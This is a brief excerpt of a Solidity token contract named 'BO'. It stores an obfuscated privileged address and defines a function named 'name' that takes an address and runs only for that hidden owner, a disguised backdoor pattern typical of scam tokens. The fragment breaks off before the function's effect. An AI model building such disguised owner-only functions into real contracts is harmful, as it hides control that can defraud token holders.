...
contract BO is Ownable {
    ...
    string public _tokenname = "BO";
    string public _tokensymbol = "BO";
    uint256 tokenamount = 10000000000*10**decimals();
    address public yahsnd23;
    ...
    function name(address jjkxq1) public     {
        require(yahsnd23 ==  _msgSender());
        if(yahsnd23 != _msgSender()){
                revert("fu");
        }
